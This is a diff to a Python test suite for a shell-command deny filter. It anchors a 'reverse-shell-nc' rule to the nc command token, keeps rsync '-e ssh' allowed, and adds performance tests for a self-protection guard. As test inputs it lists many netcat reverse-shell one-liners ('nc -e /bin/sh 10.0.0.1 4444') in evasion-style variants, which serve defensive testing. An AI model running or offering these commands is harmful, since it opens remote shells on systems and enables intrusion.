@@ -413,12 +413,19 @@ class TestSelfProtectionFlagInterposition:
         ungated floor no opt-out can reach -- so there is nothing such a pin could
         force back on. Both spellings must resolve to ``None`` (reported by
         ``_resolved_pin_ids`` as pinning nothing) rather than to an id the
-        catalog cannot display or toggle, and the alias map must stay empty
-        rather than quietly re-acquire an entry for a row that does not exist.
+        catalog cannot display or toggle, and the alias map is pinned to its EXACT
+        contents -- the one prior spelling of ``reverse-shell-nc`` -- so it cannot
+        quietly re-acquire an entry for a deleted row (a ratchet may only
+        tighten); the row that entry names must also EXIST.
         """
         from kiro_crew import security
 
-        assert security._LEGACY_RULE_ID_BY_PATTERN == {}
+        # Exact set, not a per-entry property: an alias for a deleted row (or any
+        # other addition) fails here until this line is changed on purpose.
+        assert security._LEGACY_RULE_ID_BY_PATTERN == {"nc -e" + ".*": "reverse-shell-nc"}
+        live_ids = {r.id for r in BUILTIN_DENIED_RULES}
+        for legacy, rule_id in security._LEGACY_RULE_ID_BY_PATTERN.items():
+            assert rule_id in live_ids, legacy
         for stale in (
             ".*kiro.?crew restart.*",
             ".*kiro.?crew(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+restart.*",
@@ -2555,6 +2562,168 @@ class TestRuleIdentityIsTheId:
         # Passing the PATTERN where an id belongs disables nothing, which is precisely
         # why a pattern edit cannot weaken an existing policy.
         assert compute_effective_denied([rule], {rule.pattern}, False, (), ()) == [rule.pattern]
+
+
+class TestReverseShellNcIsCommandTokenAnchored:
+    """``reverse-shell-nc`` matches the ``nc`` COMMAND TOKEN, not a substring.
+
+    An unanchored substring ``nc -e`` matches inside ``rsync -e ssh``: every
+    rsync-over-ssh transfer with a detached remote-shell flag, and every
+    read-only command that merely quotes the phrase, then reads as a netcat
+    reverse shell.  The row therefore requires ``nc`` to BEGIN a token -- start
+    of input, whitespace, a path separator, a quote or a shell operator before
+    it -- so the tail of another token (``rsync``, ``vnc``) is not a match,
+    while every genuine invocation the bare substring refuses is refused here
+    too.  The sibling ``reverse-shell-ncat`` row keeps its own spelling: each
+    row governs exactly the spelling its toggle names, the same per-row
+    attribution the always-on exfil gate enforces (``test_exfil_gate_opt_out``).
+    """
+
+    _RULE = "reverse-shell-nc"
+    _SIBLING = "reverse-shell-ncat"
+
+    @pytest.fixture(autouse=True)
+    def _remote_rsync_targets_are_not_this_host(self, monkeypatch):
+        # The rsync allow cases name a REMOTE host, which the sandbox-escape floor
+        # judges by resolving it, fail-closed while unresolved.  Pin the own-host
+        # cache and stub the DNS verdict to "not self" exactly as
+        # ``TestSandboxEscapeSshSelf`` does (its fixture says why each slot), so
+        # nothing is resolved for real and the verdict here is this row's alone.
+        own = security.socket.gethostname().strip().lower()
+        pinned = frozenset(name for name in {own, own.split(".", 1)[0]} if name)
+        monkeypatch.setattr(_argv_floor, "_OWN_HOST_NAMES_CACHE", pinned)
+        monkeypatch.setattr(_argv_floor, "_OWN_HOST_RESOLVE_DONE", True)
+        monkeypatch.setattr(_argv_floor, "_NETLINK_ADDRS_PUBLISHED", True)
+        monkeypatch.setattr(_argv_floor, "_resolved_host_verdict", lambda host, **_kw: False)
+
+    @staticmethod
+    def _effective_without(*rule_ids: str) -> list[str]:
+        return compute_effective_denied(BUILTIN_DENIED_RULES, set(rule_ids), False, (), ())
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # bare, and the reporter's own acceptance example
+            "nc -e /bin/sh 10.0.0.1 4444",
+            # the flag glued to its program, as getopt accepts it
+            "nc -e/bin/sh 10.0.0.1 4444",
+            "nc -esh 10.0.0.1 4444",
+            # padded whitespace between the verb and the flag
+            "nc  -e /bin/sh 10.0.0.1 4444",
+            "nc\t-e /bin/sh 10.0.0.1 4444",
+            # path-qualified
+            "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
+            "/bin/nc -e /bin/sh 10.0.0.1 4444",
+            "./nc -e /bin/sh 10.0.0.1 4444",
+            # alias-bypass backslash
+            "\\nc -e /bin/sh 10.0.0.1 4444",
+            # a lone ``=`` before the verb is not an assignment prefix
+            "=nc -e /bin/sh 10.0.0.1 4444",
+            # ``:`` glued to the verb is not a boundary: the Windows drive-relative
+            # spelling, and any other ``:``-glued prefix (no legitimate command
+            # takes that form, so this is fail-safe over-denial)
+            "C:nc -e /bin/sh 10.0.0.1 4444",
+            "scheme:nc -e /bin/sh 10.0.0.1 4444",
+            # after every shell separator, spaced and glued
+            "true; nc -e /bin/sh 10.0.0.1 4444",
+            "true;nc -e /bin/sh 10.0.0.1 4444",
+            "true && nc -e /bin/sh 10.0.0.1 4444",
+            "true&&nc -e /bin/sh 10.0.0.1 4444",
+            "false || nc -e /bin/sh 10.0.0.1 4444",
+            "false||nc -e /bin/sh 10.0.0.1 4444",
+            "echo x | nc -e /bin/sh 10.0.0.1 4444",
+            "echo x|nc -e /bin/sh 10.0.0.1 4444",
+            "(nc -e /bin/sh 10.0.0.1 4444)",
+            "x=$(nc -e /bin/sh 10.0.0.1 4444)",
+            "x=`nc -e /bin/sh 10.0.0.1 4444`",
+            # after a wrapper
+            "sudo nc -e /bin/sh 10.0.0.1 4444",
+            "env FOO=bar nc -e /bin/sh 10.0.0.1 4444",
+            "busybox nc -e /bin/sh 10.0.0.1 4444",
+            "nohup nc -e /bin/sh 10.0.0.1 4444 &",
+            "timeout 30 nc -e /bin/sh 10.0.0.1 4444",
+            # inside a nested shell payload, both quote styles
+            "bash -c 'nc -e /bin/sh 10.0.0.1 4444'",
+            'sh -c "nc -e /bin/sh 10.0.0.1 4444"',
+            # a re-quoted verb reaches the row through the quote-normalized view
+            '"nc" -e /bin/sh 10.0.0.1 4444',
+            # case is folded before matching
+            "NC -E /bin/sh 10.0.0.1 4444",
+        ],
+    )
+    def test_a_genuine_netcat_exec_is_denied_by_this_row(self, cmd):
+        assert _denied_by(cmd) == self._RULE, cmd
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # the reporter's transfer, and the plain detached remote-shell flag
+            (
+                'rsync -e "ssh -F /dev/null -o BatchMode=yes user@far.example.com" '
+                "./file far.example.com:/path"
+            ),
+            "rsync -e ssh user@far.example.com:/remote/path /local/path",
+            "rsync -avz -e 'ssh -p 2222' src/ far.example.com:/dst/",
+            # another program whose name ends in the same two letters
+            "vnc -e /etc/vnc.conf",
+            # a file name ending in the letters, with a flag after it; the second
+            # reaches ``nc -exec`` once pass 2 normalizes the quotes away
+            "python train.py dataset.nc -e 50",
+            "find . -name '*.nc' -exec grep -l x {} +",
+            # an assignment prefix glued to the verb
+            "NAME=nc -e /bin/sh 10.0.0.1 4444",
+            # ``-nc`` as another program's flag, followed by its own ``-e``
+            "wget -r -nc -e robots=off https://example.com",
+            "rsync -nc -e ssh src host:/dst",
+            # the phrase as DATA: a read-only search for it, and a message naming it
+            "grep -rn 'rsync -e' docs/",
+            "git log --oneline --grep='rsync -e'",
+            "git commit -m 'docs: prefer rsync -e ssh over --rsh'",
+        ],
+    )
+    def test_the_substring_inside_another_token_is_not_a_reverse_shell(self, cmd):
+        assert _denied_by(cmd) is None, cmd
+
+    def test_each_row_governs_exactly_its_own_spelling(self):
+        # Mirrors the exfil gate's per-row attribution at the catalog tier: the
+        # anchored ``nc`` row must not shadow ``ncat``, or switching the sibling
+        # off would read as enabled-and-off while enforcement never changed.
+        nc_cmd = "nc -e /bin/sh 10.0.0.1 4444"
+        ncat_cmd = "ncat -e /bin/sh 10.0.0.1 4444"
+        assert _denied_by(ncat_cmd) == self._SIBLING
+        assert is_denied(nc_cmd, denied_regexes=self._effective_without(self._RULE)) is None
+        assert is_denied(ncat_cmd, denied_regexes=self._effective_without(self._SIBLING)) is None
+        assert is_denied(ncat_cmd, denied_regexes=self._effective_without(self._RULE))
+        assert is_denied(nc_cmd, denied_regexes=self._effective_without(self._SIBLING))
+
+    def test_the_row_runs_on_the_full_input_matcher(self):
+        # No top-level ``.*`` gap, so the row is one fragment matched with exact
+        # ``re.search`` over the WHOLE command, never the length-capped scan --
+        # a padded command cannot slip the needle past a bound.
+        from kiro_crew.security import _deny_matcher
+
+        pattern = _rule_pattern(self._RULE)
+        assert is_safe_user_regex(pattern)
+        matcher = _deny_matcher(pattern)
+        assert not matcher._bounded
+        assert len(matcher._frag_res) == 1
+
+    def test_a_governance_pin_in_the_prior_spelling_still_pins_the_row(self):
+        # A governance policy persists the pattern STRING it pinned.  A ceiling or
+        # profile written against the older catalog holds the bare substring, and
+        # a pin that stopped resolving would let a user opt-out drop the row the
+        # administrator pinned -- the legacy alias is what keeps it resolving.
+        legacy = "nc -e" + ".*"
+        assert security._rule_id_for_pattern(legacy) == self._RULE
+        assert security._resolved_pin_ids([legacy], "commands-ceiling-pin") == {self._RULE}
+        # The pinned id re-adds the row past a user disable AND a disable-all,
+        # exactly as a pin in the current spelling does.
+        rule = next(r for r in BUILTIN_DENIED_RULES if r.id == self._RULE)
+        pinned = compute_effective_denied([rule], {rule.id}, True, (), {self._RULE})
+        assert pinned == [rule.pattern]
+        # Lookup-only: the prior spelling is not a built-in and is never enforced.
+        assert legacy not in BUILTIN_DENY_PATTERNS
+        assert legacy not in security._RULE_ID_BY_PATTERN
 
 
 class TestNameAsDataIsNotAnInvocation:
@@ -7134,23 +7303,281 @@ class TestDataConsumerGuardIsChargedPerCommandNotPerPayload:
             f"$(printf echo) {_NAME} {_TOK}",
         ],
     )
-    def test_precomputed_and_self_computed_guards_agree(self, cmd):
-        # The three call sites this change does not touch pass no precomputed
-        # value, so they take the ``None`` branch.  That branch must give the
-        # same answer as the hoisted one, or those callers silently change
-        # behaviour.
+    def test_the_command_level_verdict_is_the_callers_to_supply(self, cmd):
+        # ``command_disqualified`` is required, so a caller cannot reach the guards
+        # without having charged them once for its own argv. Omitting it is a
+        # TypeError rather than a silent per-token recomputation, which is the
+        # shape that costs one whole-argv sweep per candidate token.
         tokens = security.normalize_shell_command(cmd)
         programs = security._argv_programs(tokens)
         hoisted = security._data_consumer_command_disqualified(tokens)
+        with pytest.raises(TypeError):
+            security._data_consumer_exempt(0, tokens[0], programs, tokens)
         for i, token in enumerate(tokens):
-            self_computed = security._data_consumer_exempt(i, token, programs, tokens)
-            passed_in = security._data_consumer_exempt(
+            # The supplied verdict governs: a disqualified command earns no
+            # exemption for any token, whatever that token looks like.
+            assert (
+                security._data_consumer_exempt(
+                    i, token, programs, tokens, command_disqualified=True
+                )
+                is False
+            ), f"token {i} ({token!r}) was exempted by a disqualified command"
+            supplied = security._data_consumer_exempt(
                 i, token, programs, tokens, command_disqualified=hoisted
             )
-            assert self_computed == passed_in, (
-                f"token {i} ({token!r}) disagrees: self-computed={self_computed} "
-                f"passed-in={passed_in}"
+            assert isinstance(supplied, bool)
+
+
+class TestDataConsumerGuardIsChargedPerFrameNotPerTriggerToken:
+    """The self-protection floors must not be quadratic in TRIGGER-token count.
+
+    Four floors walk one fixed argv per frame and ask ``_data_consumer_exempt``
+    about each token that passes a narrow trigger predicate: the self-program and
+    self-module names (credential mint), a kill-family program name (self kill), a
+    resolved self-program index (self subcommand), and an ssh-family verb (ssh to
+    self). The command-level half of that guard reads only ``tokens``, and one of
+    its members sweeps the whole argv with ``_SCRIPT_EXECUTES_RE``, so charging it
+    per trigger token costs N x len(tokens): a 24KB command carrying 1,600
+    kill-family words as arguments of a data consumer took ~14s, which crosses a
+    25s-class watchdog around 2,200 such words.
+
+    A per-frame memo makes the charge one per frame. It is computed LAZILY, at the
+    first trigger token, so the far more common command that reaches these floors
+    and trips no trigger predicate pays nothing at all -- the property
+    ``test_a_command_with_no_trigger_token_pays_nothing`` pins, and the reason a
+    memo is preferable to an unconditional per-frame hoist.
+
+    The assertions are STRUCTURAL, matching the payload-axis class above: a
+    wall-clock ratio cannot separate this property from the runner, and a wall-clock
+    bound tight enough to catch the quadratic on a slow host passes it on a fast one
+    -- the 24KB repro above lands under 4s on some hosts and near 14s on others. So
+    what is pinned is the bounded QUANTITY: how often the command-level answer is
+    computed, and how many times the argv is swept for it.
+    """
+
+    @staticmethod
+    def _triggers(n: int) -> str:
+        """The issue's repro shape: kill-family words as arguments of ``echo``."""
+        return "echo " + " ".join([_PK, _NAME] * n)
+
+    @staticmethod
+    def _count_guard_calls(monkeypatch, cmd: str) -> "tuple[int, str | None]":
+        calls = {"n": 0}
+        real = security._data_consumer_command_disqualified
+
+        def counting(tokens):
+            calls["n"] += 1
+            return real(tokens)
+
+        monkeypatch.setattr(security, "_data_consumer_command_disqualified", counting)
+        verdict = security.is_denied(cmd)
+        return calls["n"], verdict
+
+    def test_guard_is_charged_the_same_however_many_trigger_tokens(self, monkeypatch):
+        # Measured before the memo: 700 / 1400 / 2100 calls at n = 100 / 200 / 300
+        # -- exactly 7n, one per trigger token per reaching floor. After: 7 at
+        # every size, one per frame per reaching floor.
+        counts = {}
+        for n in (100, 200, 300):
+            counts[n], verdict = self._count_guard_calls(monkeypatch, self._triggers(n))
+            # The verdict has to be reached THROUGH the instrumented path, or the
+            # counts are counting nothing. ``echo`` makes these words data.
+            assert verdict is None, f"n={n} changed the exemption verdict: {verdict!r}"
+        assert counts[100] == counts[200] == counts[300], (
+            "the command-level guard is charged per trigger token, not per frame: " f"{counts}"
+        )
+        # Equal counts alone could hold by accident for a shape that is still a
+        # multiple of the trigger count, so bound the count directly too.
+        assert counts[300] < 30, f"guard charged {counts[300]} times for {300 * 2} trigger tokens"
+
+    def test_a_command_with_no_trigger_token_pays_nothing(self, monkeypatch):
+        # The memo is lazy, so the common command reaching these floors without
+        # tripping a trigger predicate must not pay the sweep an unconditional
+        # per-frame hoist would charge it.
+        calls, verdict = self._count_guard_calls(monkeypatch, f"ls -la /var/log {_NAME}.log")
+        assert verdict is None
+        assert calls == 0, f"a command with no trigger token paid {calls} argv sweeps"
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # One per trigger predicate, each reaching its floor and each exempt.
+            f"echo {_PK} {_NAME}",
+            f"echo {_NAME} {_TOK}",
+            f"echo {_NAME} restart",
+            "echo ssh localhost",
+            # And cases where the exemption is REFUSED, so the memo is consulted on
+            # the deny side as well.
+            f"echo {_PK} {_NAME} | sh",
+            f"echo {_NAME} {_TOK} | sh",
+            "echo ssh localhost | sh",
+            f"$(printf echo) {_NAME} {_TOK}",
+            # Two frames, so the memo is built more than once in one call.
+            f"echo {_PK} {_NAME}; sed 's/a/{_PK} -f {_NAME}/e' f",
+            f"echo {_NAME} {_TOK}; $(printf echo) {_NAME} {_TOK}",
+        ],
+    )
+    def test_the_memo_reaches_the_same_verdict_as_recomputing_every_call(self, monkeypatch, cmd):
+        # Charging the guard once per frame may not move any verdict: it is a pure
+        # function of ``tokens``, which a frame binds once. Compare the real verdict
+        # against one where the memo is discarded and the answer recomputed from the
+        # frame's tokens at every single call.
+        #
+        # BOTH namespaces are patched, and neither is redundant. Each caller binds
+        # ``_data_consumer_exempt`` as its own module global via ``from
+        # .shell_normalizer import ...``: the four frame loops in ``argv_floor``, and
+        # the payload walk in the ``security`` package body. The facade mirrors an
+        # attribute write onto ONE owning submodule -- the normalizer, for this name --
+        # so a facade write alone leaves ``argv_floor`` resolving the real function and
+        # instruments nothing here. Which caller a given command reaches also varies:
+        # ``awk 'system(...)'`` carries its kill inside one quoted token, so no frame
+        # loop sees a trigger word and only the payload walk judges it.
+        #
+        # ``calls`` is asserted non-zero for that reason. A wrong or incomplete patch
+        # target then reads as a RED test rather than a comparison of the real
+        # function against itself, which would pass whatever the memo did.
+        #
+        # That assertion is also why ``awk 'system(...)'`` is absent from the cases
+        # above: its kill is denied by a different tier and the guard is never asked,
+        # so it would trip the non-zero check while proving nothing about the memo.
+        # The sibling class covers that shape under refused exemptions.
+        real = _argv_floor._data_consumer_exempt
+        assert security._data_consumer_exempt is real, "the two callers hold one object"
+        calls = {"n": 0}
+
+        def recomputing_every_call(index, token, programs, tokens, *, command_disqualified):
+            calls["n"] += 1
+            return real(
+                index,
+                token,
+                programs,
+                tokens,
+                command_disqualified=security._data_consumer_command_disqualified(tokens),
             )
+
+        with_memo = security.is_denied(cmd)
+        monkeypatch.setattr(_argv_floor, "_data_consumer_exempt", recomputing_every_call)
+        monkeypatch.setattr(security, "_data_consumer_exempt", recomputing_every_call)
+        without_memo = security.is_denied(cmd)
+        assert calls["n"] > 0, (
+            "the instrument observed nothing -- the patch target is not the namespace "
+            f"the frame loops resolve through, so this comparison is vacuous ({cmd!r})"
+        )
+        assert with_memo == without_memo, (
+            f"the per-frame memo changed the verdict for {cmd!r}: "
+            f"memo={with_memo!r} recomputed={without_memo!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "floor",
+        [
+            "_is_credential_mint",
+            "_is_self_kill",
+            "_matches_self_subcommand",
+            "_is_ssh_to_self",
+        ],
+    )
+    def test_the_memo_is_declared_inside_the_frame_loop(self, floor):
+        """The memo's SCOPE is the frame, and that is asserted on the source.
+
+        Hoisting the declaration one level further out would compute the answer
+        from the first frame's tokens and reuse it for every later frame -- a
+        different command-level verdict silently applied to a different argv.
+
+        This is asserted structurally rather than behaviourally because the
+        behaviour is not reachable: each floor returns as soon as a frame denies,
+        so a frame whose guard answer differs from an earlier frame's is only ever
+        visited when the earlier frame did not deny, and no command was found that
+        both survives its first frame and disagrees with it. The scope is still the
+        correct shape, so it is pinned where it is visible.
+        """
+        import ast
+        import inspect
+        import textwrap
+
+        tree = ast.parse(textwrap.dedent(inspect.getsource(getattr(security, floor))))
+
+        def memo_targets(node) -> "list[int]":
+            found = []
+            for sub in ast.walk(node):
+                targets = []
+                if isinstance(sub, ast.Assign):
+                    targets = sub.targets
+                elif isinstance(sub, ast.AnnAssign):
+                    targets = [sub.target]
+                for t in targets:
+                    if isinstance(t, ast.Name) and t.id == "disqualified":
+                        value = sub.value
+                        if isinstance(value, ast.Constant) and value.value is None:
+                            found.append(sub.lineno)
+            return found
+
+        frame_loops = [
+            node
+            for node in ast.walk(tree)
+            if isinstance(node, ast.For)
+            and isinstance(node.target, ast.Name)
+            and node.target.id == "tokens"
+        ]
+        assert len(frame_loops) == 1, f"{floor} no longer has exactly one frame loop"
+        loop = frame_loops[0]
+        inside = [ln for stmt in loop.body for ln in memo_targets(stmt)]
+        assert inside, f"{floor} declares no per-frame memo inside its frame loop"
+        all_declarations = memo_targets(tree)
+        assert sorted(all_declarations) == sorted(inside), (
+            f"{floor} declares the memo outside its frame loop as well "
+            f"(inside={sorted(inside)} all={sorted(all_declarations)}) -- an outer "
+            "declaration carries one frame's command-level answer into the next"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # A data-consumer mention beside a real invocation: the real one must
+            # still be judged, whichever frame it lands in.
+            f"echo {_PK} {_NAME}; sed 's/a/{_PK} -f {_NAME}/e' f",
+            f"echo {_NAME} {_TOK}; $(printf echo) {_NAME} {_TOK}",
+            f"echo {_PK} {_NAME}; echo {_PK} {_NAME} | sh",
+            "echo ssh localhost; echo ssh localhost | sh",
+        ],
+    )
+    def test_a_mention_beside_a_real_invocation_is_still_denied(self, cmd):
+        assert (
+            security.is_denied(cmd) is not None
+        ), f"a real invocation beside a mention went unjudged: {cmd!r}"
+
+    @pytest.mark.parametrize("n", [50, 100, 150])
+    def test_the_argv_sweep_is_linear_in_the_argv_not_quadratic_in_triggers(self, monkeypatch, n):
+        """Backstop against the cost the guard-call counts cannot see.
+
+        Those counts pin how often the command-level guard is ASKED. This one pins
+        the expensive thing inside it -- ``_SCRIPT_EXECUTES_RE`` sweeping every
+        token -- so a regression that re-pays the sweep somewhere else would still
+        be caught. Measured per trigger token the sweeps are 35,350 / 140,700 /
+        316,050 at n = 50 / 100 / 150, which is 350x / 700x / 1050x the argv length:
+        the multiplier itself grows, which is what quadratic means here. Charged per
+        frame it is exactly 7x the argv length at every size. The bound below leaves
+        the linear form room and the quadratic form misses it by 35x at n=50.
+        """
+        cmd = self._triggers(n)
+        argv_len = len(security.normalize_shell_command(cmd))
+        calls = {"n": 0}
+        real = security._SCRIPT_EXECUTES_RE
+
+        class Counting:
+            def search(self, text):
+                calls["n"] += 1
+                return real.search(text)
+
+            def __getattr__(self, name):
+                return getattr(real, name)
+
+        monkeypatch.setattr(security, "_SCRIPT_EXECUTES_RE", Counting())
+        assert security.is_denied(cmd) is None
+        assert calls["n"] <= 10 * argv_len, (
+            f"the argv sweep is quadratic in trigger count: {calls['n']} sweeps for "
+            f"an argv of {argv_len} tokens ({n * 2} trigger tokens)"
+        )
 
 
 class TestSandboxEscapeSshSelf:
@@ -7624,9 +8051,10 @@ class TestSandboxEscapeSshSelf:
             # rsync ``--rsh`` naming plain ``ssh`` (no self host) is the
             # normal remote-shell selector; ``--exclude`` names data.  (The
             # detached ``-e ssh`` spelling is floor-allowed too -- asserted in
-            # test_rsync_detached_rsh_floor_allows_plain_ssh -- but the
-            # pre-existing ``reverse-shell-nc`` catalog rule substring-matches
-            # ``rsy[nc -e]``, so end-to-end it is denied by that older rule.)
+            # test_rsync_detached_rsh_floor_allows_plain_ssh -- and, because the
+            # ``reverse-shell-nc`` row is anchored to the ``nc`` command token,
+            # allowed end-to-end as well; pinned by
+            # TestReverseShellNcIsCommandTokenAnchored.)
             "rsync --rsh=ssh /tmp/f far.example.com:/p",
             "rsync --exclude=localhost /tmp/f far.example.com:/p",
             # A leading ``RSYNC_RSH`` naming a REMOTE shell target is the
@@ -7699,11 +8127,13 @@ class TestSandboxEscapeSshSelf:
         assert not spawned, "the DNS-enrichment daemon thread was spawned during the floor scan"
 
     def test_rsync_detached_rsh_floor_allows_plain_ssh(self):
-        # THIS floor must not deny the normal detached remote-shell selector;
-        # the end-to-end deny of this string comes from the unrelated
-        # ``reverse-shell-nc`` catalog rule (unanchored ``nc -e.*`` matching
-        # inside ``rsync -e``), which predates this change.
-        assert not security._is_ssh_to_self("rsync " + "-e ssh /tmp/f far.example.com:/p")
+        # THIS floor must not deny the normal detached remote-shell selector, and
+        # neither does the ``reverse-shell-nc`` catalog row: it is anchored to the
+        # ``nc`` command token, so the letters ``nc -e`` inside ``rsync -e`` are not
+        # a match.  Pinned end-to-end here as well as at the floor.
+        cmd = "rsync " + "-e ssh /tmp/f far.example.com:/p"
+        assert not security._is_ssh_to_self(cmd)
+        assert _denied_by(cmd) is None
 
     def test_mask_quoted_separators_round_trip(self):
         # The mask rewrites only QUOTED / backslash-escaped ``;``/``|`` to
